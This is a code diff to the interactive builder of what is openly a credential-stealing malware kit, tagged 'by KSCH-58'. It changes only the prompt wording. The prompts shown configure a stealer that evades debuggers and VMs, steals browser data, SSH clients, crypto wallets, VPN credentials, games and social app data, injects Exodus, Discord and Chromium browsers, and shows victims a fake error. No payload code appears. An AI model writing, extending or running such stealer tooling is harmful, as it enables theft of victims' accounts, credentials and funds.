@@ -85,58 +85,58 @@ async function completeConfiguration() {
           askQuestion("Enter your executable file description: ", (answer) => {
             config["description"] = answer + " by KSCH-58";
             config["appFileDescription"] = answer;
-            askQuestion("Do you want to block debug and VM ? ", (answer) => {
+            askQuestion("Do you want to block debug and VM ? [y/n]", (answer) => {
               let y = translateResponse(answer);
               config["blockdebug"] = y;
-              askQuestion("Do you want to steal games ? ", (answer) => {
+              askQuestion("Do you want to steal games ? [y/n]", (answer) => {
                 let y = translateResponse(answer);
                 config["game"] = y;
                 config["launchers"] = y;
                 askQuestion(
-                  "Do you want to inject exodus/discord ? ",
+                  "Do you want to inject exodus/discord ? [y/n]",
                   (answer) => {
                     let y = translateResponse(answer);
                     config["inject"] = y;
                     askQuestion(
-                      "Do you want to steal system informations ? ",
+                      "Do you want to steal system informations ? [y/n]",
                       (answer) => {
                         let y = translateResponse(answer);
                         config["sysinfo"] = y;
                         askQuestion(
-                          "Do you want to steal clients ssh ? ",
+                          "Do you want to steal clients ssh ? [y/n]",
                           (answer) => {
                             let y = translateResponse(answer);
                             config["clients"] = y;
                             askQuestion(
-                              "Do you want to steal browsers ? ",
+                              "Do you want to steal browsers ? [y/n]",
                               (answer) => {
                                 let y = translateResponse(answer);
                                 config["browsers"] = y;
                                 askQuestion(
-                                  "Do you want to open a fake error ? ",
+                                  "Do you want to open a fake error ? [y/n]",
                                   async (answer) => {
                                     let y = translateResponse(answer);
                                     config["fakeerror"] = y;
                                     askQuestion(
-                                      "Do you want to steal crypto wallets ? ",
+                                      "Do you want to steal crypto wallets ? [y/n]",
                                       (answer) => {
                                         let y = translateResponse(answer);
                                         config["wallets"] = y;
 
                                         askQuestion(
-                                          "Do you want to steal vpn ? ",
+                                          "Do you want to steal vpn ? [y/n]",
                                           (answer) => {
                                             let y = translateResponse(answer);
                                             config["vpn"] = y;
 
                                             askQuestion(
-                                              "Do you want to inject all chromium browsers ? ",
+                                              "Do you want to inject all chromium browsers ? [y/n]",
                                               (answer) => {
                                                 let y =
                                                   translateResponse(answer);
                                                 config["chromeinjection"] = y;
                                                 askQuestion(
-                                                  "Do you want to steal social app ? ",
+                                                  "Do you want to steal social app ? [y/n]",
                                                   async (answer) => {
                                                     let y =
                                                       translateResponse(answer);
